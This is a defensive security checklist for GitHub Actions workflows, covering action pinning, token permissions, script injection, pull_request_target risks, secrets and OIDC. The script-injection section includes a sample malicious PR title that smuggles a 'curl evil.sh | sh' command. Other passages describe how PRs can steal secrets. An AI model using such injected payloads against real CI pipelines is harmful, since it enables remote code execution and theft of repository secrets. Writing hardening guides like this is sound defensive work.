---
tags: [gha, cicd, security, secrets]
source: GitHub Actions official documentation (https://docs.github.com/en/actions/) and GitHub Security Lab research, summarised
---

# GitHub Actions Security Hardening

Project-agnostic audit checklist for GitHub Actions workflows. Every rule below maps to a documented attack vector or hardening guideline from GitHub's security guides. Cite a rule by its `<rule-id>`.

> **Scope:** workflow security — third-party action provenance, `GITHUB_TOKEN` permissions, secret handling, script injection, malicious-PR mitigations, OIDC cloud auth, fork-PR posture. Workflow correctness (concurrency, caching, matrix, gating) lives in `gha-workflow-design.md`.
>
> **References:** [Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions), [Using secrets in GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions), [Automatic token authentication](https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication), [About OIDC](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect), [GHSL: Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/).

## Third-party action provenance — `sec-pin-*`

### `sec-pin-full-sha`

Every third-party action MUST be pinned to a **full-length commit SHA**, not a tag or branch. Tags can be retroactively moved by the action's maintainer (or by an attacker who gains write access to the action repo); a SHA cannot. Canonical form:

```yaml
uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
```

The `# v4.1.1` comment is mandatory documentation but has no semantic effect — Dependabot uses it to detect upgrades. A bare tag (`uses: actions/checkout@v4`) is acceptable **only** for first-party `actions/*`, `github/*`, and explicitly-trusted "Verified creator" actions where the maintainer enforces the SHA-pinning policy on their side. Document the allowlist in the workflow.

### `sec-pin-no-branch-refs`

`uses: some/action@main` is **never** acceptable — `main` moves on every commit, and a compromised branch ships exploit code into every CI run that uses it. Even for first-party actions, prefer tagged releases over branch refs.

### `sec-pin-organisation-policy`

GitHub offers org-level and repo-level policy controls to *require* SHA pinning across all workflows (`Settings → Actions → General → Allow actions and reusable workflows`). Recommend enabling this when the host repo has more than a handful of workflows — it makes drift detectable at PR time instead of audit time.

### `sec-pin-dependabot-coverage`

Configure Dependabot for `package-ecosystem: "github-actions"` so SHA-pinned actions get version-update PRs. A pinned-but-stale action is its own risk (CVEs in the action itself); Dependabot closes that gap.

## `GITHUB_TOKEN` least privilege — `sec-token-*`

### `sec-token-default-read-only`

The default `GITHUB_TOKEN` permissions are inherited from the repo/org settings. Set the *workflow-level* default to read-only and grant write scopes per-job:

```yaml
permissions:
  contents: read

jobs:
  release:
    permissions:
      contents: write
      packages: write
```

Workflows that omit a top-level `permissions:` block inherit potentially-broad org defaults. Audit every workflow file — a missing `permissions:` is a finding.

### `sec-token-scope-narrow-per-job`

Per-job `permissions:` should grant the **minimum** scopes the job actually uses. Common patterns:

- A test/lint job: `contents: read` only.
- A job that creates issues / comments on PRs: `issues: write` and/or `pull-requests: write`.
- A job that publishes a release: `contents: write`.
- A job that pushes to GHCR: `packages: write`.
- A job that comments on PRs from the *same* repo (not forks): `pull-requests: write`.

Granting `contents: write` to a test job is a finding — a compromised test step can rewrite the repo.

### `sec-token-no-write-on-fork-pr`

`pull_request` events from a fork get a **read-only** `GITHUB_TOKEN` regardless of the workflow's `permissions:` block. Workflows that need to comment on fork PRs must use `workflow_run` (post-merge of test results) or accept that the comment step will silently no-op on forks. Do **not** work around this with a PAT — see `sec-pwn-no-pull-request-target`.

### `sec-token-not-for-recursive-triggers`

Events triggered by `GITHUB_TOKEN` actions do **not** spawn new workflow runs (with the exception of `workflow_dispatch` and `repository_dispatch`). A workflow that pushes a commit using `GITHUB_TOKEN` will not re-trigger CI on that commit. If recursion is required (e.g. a release tag should trigger the release workflow), use a GitHub App installation token or PAT — and mark the use case in a comment.

## Script injection — `sec-inject-*`

### `sec-inject-no-direct-interpolation`

Untrusted GitHub event data (`github.event.pull_request.title`, `github.event.issue.body`, `github.event.head_commit.message`, etc.) MUST NOT be interpolated directly into a `run:` script. The expansion happens before bash sees the script, so attacker-controlled input becomes attacker-controlled bash:

```yaml
# BROKEN — script injection
run: echo "PR title: ${{ github.event.pull_request.title }}"

# CORRECT — env indirection
env:
  PR_TITLE: ${{ github.event.pull_request.title }}
run: echo "PR title: $PR_TITLE"
```

The env-var indirection works because the value is passed as a string to bash, not concatenated into the source. A malicious title `a"; curl evil.sh | sh; echo "` becomes harmless under env indirection.

### `sec-inject-untrusted-fields`

The fields most often used as injection vectors:

- `github.event.pull_request.title`, `.body`, `.head.ref`, `.head.label`
- `github.event.issue.title`, `.body`
- `github.event.head_commit.message`, `.author.email`, `.author.name`
- `github.event.commits[*].message`
- `github.event.review.body`
- `github.event.comment.body`
- `github.event.discussion.title`, `.body`
- `github.head_ref`, `github.event.workflow_run.head_branch`

Any of these in a `run:` block without env indirection is a finding.

### `sec-inject-prefer-actions-over-shell`

A custom JavaScript/composite action that takes the value as an `inputs:` parameter is structurally safer than an inline shell script — the value reaches the action as a function argument, never as a shell concatenation. Recommend converting injection-prone shell logic into a small composite action.

### `sec-inject-shellcheck-double-quote`

Even with env indirection, follow standard shell hygiene: `"$VAR"` (quoted) instead of `$VAR` (unquoted, prone to word-splitting). This is not GHA-specific but it interacts: a value that comes from `${{ ... }}` and gets word-split can recombine with an attacker-influenced second variable into an injection.

## Pull-request triggers — `sec-pwn-*`

### `sec-pwn-no-pull-request-target-with-checkout`

The `pull_request_target` trigger runs in the context of the **target** (base) repo, with **write** permissions and **secret** access. It is the right primitive for labelling, commenting, or running trusted post-merge logic. It is **the wrong primitive** for building/testing PR code.

The "pwn request" pattern combines `pull_request_target` with `actions/checkout` of the PR head SHA — that grants attacker-controlled code (the PR diff) write access and secrets access to the target repo. Examples of how this is exploited:

- The PR adds a malicious `package.json` `preinstall` script; `npm install` runs it with secrets in the env.
- The PR modifies the test runner config to exfiltrate `secrets.*` to an attacker server.
- The PR adds a custom `Makefile` target that the workflow invokes.

CodeQL has a rule for this pattern. The fix:

- Use `pull_request` (not `pull_request_target`) for any workflow that builds/tests PR code. This gives a read-only `GITHUB_TOKEN` and no access to secrets.
- Use `pull_request_target` only for jobs that do not check out the PR head — e.g. labelling based on the title, or commenting based on file paths.
- For "build PR + comment results" workflows, split into two: a `pull_request` job that builds and uploads an artifact, and a `workflow_run` job that reads the artifact and comments.

### `sec-pwn-no-secrets-in-pull-request-build`

Even on `pull_request` (not `_target`), do not pass secrets into a job that builds untrusted PR code:

```yaml
# BROKEN — secret leaks into attacker code
on: pull_request
jobs:
  build:
    steps:
      - run: ./build.sh
        env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
```

The PR's `./build.sh` can `echo "$DEPLOY_KEY"` to its own stdout (or to a curl request). Move secret-using steps to a `workflow_run` or `push` job triggered after merge.

### `sec-pwn-validate-dispatch-input`

`workflow_dispatch` inputs that select a ref to validate (common in iterate/release loops) MUST be validated server-side before `actions/checkout`. A `validate-dispatch` pre-flight job that fails fast (~5 s) when the input doesn't match an allowlist of branch prefixes prevents accidental validation of `main` or attacker-supplied refs.

### `sec-pwn-fork-tests-isolated`

Fork PRs have inherent risks even under `pull_request`. Mitigations:

- Require approval from a trusted reviewer before any workflow runs (`Settings → Actions → General → Fork pull request workflows`).
- Use `environment:` with required reviewers for any job that needs secrets.
- Run forked test jobs in a hardened container (no host filesystem, no privileged mounts).

## Secrets — `secrets-*`

### `secrets-never-structured`

Never store JSON, XML, YAML, or any structured blob as a single secret. The log redactor matches secrets by exact string — a JSON blob with whitespace variations (or one re-emitted by an action) won't match its registered form, and the secret will appear in logs unredacted. Split structured secrets into individual values.

### `secrets-add-mask-derived-values`

When a secret is transformed (base64-decoded, JWT-signed, hash of secret, etc.), the new value is **not** automatically redacted. Register it explicitly with `::add-mask::VALUE` (via the `core.setSecret` helper or a `run:` step that echoes the directive). Forgetting this step leaks the derived value when it appears in subsequent logs.

### `secrets-environment-required-reviewers`

For deployment / release secrets, scope them to a GitHub Environment with **required reviewers** rather than to the repo. Required reviewers gate access — a malicious PR can't trigger a deploy workflow that consumes the environment's secrets without approval. Use this for production-signing keys, deploy tokens, API keys with billing impact.

### `secrets-rotate-on-suspected-leak`

If a secret appears unredacted in any log, the secret is **compromised**. Steps in order:

1. Delete the run logs (`gh run delete <run-id>`).
2. Rotate the secret at its source (issuer, cloud provider, etc.).
3. Update the GitHub secret with the new value.
4. Audit downstream systems for unauthorized use during the leak window.

A secret leak that is "logged but not used by an attacker" is still a leak — rotate.

### `secrets-not-from-fork-context`

Repository secrets are NOT exposed to workflows triggered by a fork PR via `pull_request`. They ARE exposed via `pull_request_target` — which is the entire point of the trigger. Combined with `sec-pwn-no-pull-request-target-with-checkout`, this means any `pull_request_target` workflow has secrets and must not check out untrusted code.

### `secrets-no-plaintext-in-conf`

Never commit a real secret value into `tauri.conf.json`, `package.json`, source code, or any committed file. Any value that should not be in the public history is a secret — including signing thumbprints (audit log artefact) and updater pubkey hashes (rotate-resistance).

## OpenID Connect — `oidc-*`

### `oidc-prefer-over-static-secrets`

When a workflow needs cloud credentials (AWS, Azure, GCP, HashiCorp Vault), prefer OIDC token exchange over storing long-lived static secrets:

```yaml
permissions:
  id-token: write   # required for OIDC
  contents: read

steps:
  - uses: aws-actions/configure-aws-credentials@<sha>  # v4
    with:
      role-to-assume: arn:aws:iam::123456789012:role/my-role
      aws-region: us-east-1
```

Benefits:
- No long-lived cloud creds in GitHub secrets.
- Per-job tokens that expire when the job ends.
- Cloud-side trust scoped to repo/branch/environment via the OIDC `sub` claim.

### `oidc-id-token-write-permission`

OIDC requires `permissions.id-token: write` on the job. Without it, `getIDToken()` returns 403. Don't grant `id-token: write` workflow-wide — scope it to the job that needs it.

### `oidc-trust-scope-narrow`

The OIDC `sub` claim contains repo, branch, and (optionally) environment data. Configure the cloud-side trust to require the most specific match — e.g. `repo:org/repo:ref:refs/heads/main` rather than `repo:org/repo:*`. A wildcard trust lets any branch (or a branch a malicious PR creates) assume the role.

### `oidc-environment-binds-trust`

Use GitHub Environments to bind OIDC trust to a deployment context (`environment: production` in the workflow → cloud trust matches `repo:org/repo:environment:production`). This composes with the environment's required-reviewers gate to require human approval before any production credential is issued.

## CodeQL & policy — `sec-policy-*`

### `sec-policy-codeql-actions-enabled`

Enable CodeQL for GitHub Actions in the host repo's security settings — it identifies the patterns codified above (script injection, `pull_request_target` misuse, missing `permissions:`) and surfaces them as code-scanning alerts. This is a defence-in-depth on top of manual review.

### `sec-policy-codeowners-on-workflows`

Add `.github/workflows/` to `CODEOWNERS` so workflow changes require review from a designated owner. A workflow change is high-blast-radius — it touches CI, secrets, and deployment all at once.

### `sec-policy-no-self-hosted-on-public-repo`

Do not run untrusted code on self-hosted runners attached to a public repo. Self-hosted runners persist between jobs (filesystem, network, environment) — a fork PR's job can leave a backdoor for the next job. Use ephemeral, GitHub-hosted runners for any public-repo CI; reserve self-hosted for trusted internal repos.
